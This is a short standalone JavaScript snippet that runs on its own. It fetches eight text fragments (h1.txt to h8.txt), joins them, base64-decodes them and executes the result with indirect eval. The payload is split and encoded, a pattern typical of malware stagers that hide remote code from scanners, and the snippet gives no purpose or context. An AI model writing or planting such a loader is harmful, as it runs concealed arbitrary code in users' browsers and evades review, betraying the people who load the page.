(async function(){
  const ps=await Promise.all([1,2,3,4,5,6,7,8].map(i=>fetch('h'+i+'.txt').then(r=>r.text())));
  const bin=Uint8Array.from(atob(ps.join('')),c=>c.charCodeAt(0));
  (0,eval)(new TextDecoder().decode(bin));
})();
